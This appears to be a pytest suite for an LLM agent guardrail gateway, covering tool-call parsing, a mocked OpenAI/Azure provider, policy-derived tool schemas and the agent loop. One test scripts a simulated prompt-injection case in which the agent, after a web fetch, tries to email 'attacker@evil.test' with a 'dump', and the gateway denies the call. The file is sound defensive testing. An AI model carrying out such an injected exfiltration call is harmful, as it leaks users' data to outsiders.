from __future__ import annotations

import json
from typing import Any

import httpx
import pytest

from guardrails_gateway.agent import GuardedAgent, tool_schemas
from guardrails_gateway.gateway import Gateway
from guardrails_gateway.models import Outcome
from guardrails_gateway.providers import (
    ModelTurn,
    OpenAICompatibleProvider,
    ProviderError,
    ScriptedProvider,
    ToolRequest,
    parse_chat_completion,
)
from tests.conftest import ALL_SUPPORT_TOOLS


def _completion(
    content: str | None = None, calls: list[tuple[str, str, Any]] | None = None
) -> dict[str, Any]:
    tool_calls = [
        {"id": cid, "type": "function", "function": {"name": name, "arguments": args}}
        for cid, name, args in (calls or [])
    ]
    message: dict[str, Any] = {"role": "assistant", "content": content}
    if tool_calls:
        message["tool_calls"] = tool_calls
    return {"choices": [{"message": message}]}


# ------------------------------------------------------------------ parsing


def test_parse_tool_calls() -> None:
    turn = parse_chat_completion(
        _completion(calls=[("c1", "search_docs", json.dumps({"query": "refunds"}))])
    )
    assert turn.tool_calls == (ToolRequest("c1", "search_docs", {"query": "refunds"}),)


def test_malformed_arguments_are_kept_not_dropped() -> None:
    turn = parse_chat_completion(_completion(calls=[("c1", "send_email", "{not json")]))
    assert "__unparseable_arguments__" in turn.tool_calls[0].arguments


def test_non_object_arguments_are_wrapped() -> None:
    turn = parse_chat_completion(_completion(calls=[("c1", "send_email", "[1, 2]")]))
    assert turn.tool_calls[0].arguments == {"__non_object_arguments__": [1, 2]}


def test_response_without_choices_is_an_error() -> None:
    with pytest.raises(ProviderError):
        parse_chat_completion({"error": "nope"})


# ------------------------------------------------------------------ HTTP provider


def _transport(
    responses: list[dict[str, Any]], seen: list[httpx.Request], status: int = 200
) -> httpx.MockTransport:
    def handler(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(status, json=responses.pop(0) if responses else {})

    return httpx.MockTransport(handler)


def test_openai_provider_sends_bearer_token_and_tools() -> None:
    seen: list[httpx.Request] = []
    provider = OpenAICompatibleProvider(
        base_url="https://llm.example.com/v1",
        model="m",
        api_key="sk-test",
        transport=_transport([_completion("hi")], seen),
    )
    turn = provider.complete(
        [{"role": "user", "content": "x"}], [{"type": "function", "function": {"name": "t"}}]
    )
    assert turn.content == "hi"
    request = seen[0]
    assert request.url.path == "/v1/chat/completions"
    assert request.headers["authorization"] == "Bearer sk-test"
    body = json.loads(request.content)
    assert body["model"] == "m" and body["tool_choice"] == "auto"


def test_azure_mode_uses_api_key_header_and_version() -> None:
    seen: list[httpx.Request] = []
    provider = OpenAICompatibleProvider(
        base_url="https://res.openai.azure.com/openai/deployments/gpt",
        model="gpt",
        api_key="azure-key",
        azure_api_version="2024-10-21",
        transport=_transport([_completion("ok")], seen),
    )
    provider.complete([], [])
    request = seen[0]
    assert request.headers["api-key"] == "azure-key"
    assert "authorization" not in request.headers
    assert request.url.params["api-version"] == "2024-10-21"
    assert "tools" not in json.loads(request.content)


def test_http_errors_raise_provider_error() -> None:
    provider = OpenAICompatibleProvider(
        base_url="https://llm.example.com/v1",
        model="m",
        transport=_transport([{"e": 1}], [], status=429),
    )
    with pytest.raises(ProviderError, match="429"):
        provider.complete([], [])


def test_from_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("AGGW_LLM_BASE_URL", "http://localhost:8000/v1")
    monkeypatch.setenv("AGGW_LLM_MODEL", "qwen")
    provider = OpenAICompatibleProvider.from_env()
    assert provider.base_url == "http://localhost:8000/v1" and provider.model == "qwen"


# ------------------------------------------------------------------ schemas


def test_tool_schemas_come_from_policy(gateway: Gateway) -> None:
    specs = {
        s["function"]["name"]: s["function"]
        for s in tool_schemas(gateway, "support-agent", [*ALL_SUPPORT_TOOLS, "delete_record"])
    }
    assert "delete_record" not in specs
    refund = specs["refund_payment"]["parameters"]
    assert refund["properties"]["amount"] == {"type": "number", "minimum": 0.01, "maximum": 500}
    assert refund["properties"]["currency"]["enum"][0] == "USD"
    assert refund["additionalProperties"] is False
    assert set(refund["required"]) == {"invoice_id", "amount", "currency"}
    assert (
        specs["read_invoice"]["parameters"]["properties"]["invoice_id"]["pattern"]
        == "^(?:INV-[0-9]{4})$"
    )


# ------------------------------------------------------------------ agent loop


def test_agent_injection_is_contained(gateway: Gateway, grant: str) -> None:
    provider = ScriptedProvider(
        [
            ModelTurn(
                tool_calls=(ToolRequest("1", "web_fetch", {"url": "https://shipping.example.org"}),)
            ),
            ModelTurn(
                tool_calls=(
                    ToolRequest("2", "send_email", {"to": "attacker@evil.test", "subject": "dump"}),
                )
            ),
            ModelTurn(
                tool_calls=(
                    ToolRequest("3", "send_email", {"to": "acme@example.com", "subject": "Update"}),
                )
            ),
            ModelTurn(content="A reviewer needs to approve the email."),
        ]
    )
    agent = GuardedAgent(gateway, provider, "support-agent", "T-1", grant)
    run = agent.run("Check the shipping page and update the customer.")

    assert [s.decision.outcome for s in run.steps] == [
        Outcome.ALLOW,
        Outcome.DENY,
        Outcome.REQUIRE_APPROVAL,
    ]
    assert run.final_answer == "A reviewer needs to approve the email."
    # The model saw the gateway's verdicts as tool results.
    last_messages = provider.seen[-1][0]
    tool_payloads = [json.loads(m["content"]) for m in last_messages if m["role"] == "tool"]
    assert [p["status"] for p in tool_payloads] == ["ok", "denied", "awaiting_human_approval"]
    # The model was never offered a tool outside its grant.
    assert "delete_record" not in provider.seen[0][1]


def test_agent_stops_at_max_steps(gateway: Gateway, grant: str) -> None:
    loop = [
        ModelTurn(tool_calls=(ToolRequest(str(i), "search_docs", {"query": "x"}),))
        for i in range(5)
    ]
    run = GuardedAgent(
        gateway, ScriptedProvider(loop), "support-agent", "T-1", grant, max_steps=3
    ).run("go")
    assert run.stopped_reason == "max_steps" and len(run.steps) == 3


def test_agent_reports_tool_errors(gateway: Gateway, grant: str) -> None:
    provider = ScriptedProvider(
        [
            ModelTurn(tool_calls=(ToolRequest("1", "search_docs", {"query": "x", "bogus": 1}),)),
            ModelTurn(content="done"),
        ]
    )
    run = GuardedAgent(gateway, provider, "support-agent", "T-1", grant).run("go")
    assert run.steps[0].error
    payload = json.loads(next(m for m in provider.seen[-1][0] if m["role"] == "tool")["content"])
    assert payload["status"] == "error"


def test_agent_over_http_provider(gateway: Gateway, grant: str) -> None:
    seen: list[httpx.Request] = []
    responses = [
        _completion(calls=[("c1", "delete_record", json.dumps({"record_id": "C-1"}))]),
        _completion("I am not allowed to delete records."),
    ]
    provider = OpenAICompatibleProvider(
        base_url="https://llm.example.com/v1", model="m", transport=_transport(responses, seen)
    )
    run = GuardedAgent(gateway, provider, "support-agent", "T-1", grant).run("delete C-1")
    assert run.steps[0].decision.rule == "grant.tool_out_of_scope"
    assert run.final_answer == "I am not allowed to delete records."
    second = json.loads(seen[1].content)
    assert second["messages"][-1]["role"] == "tool"
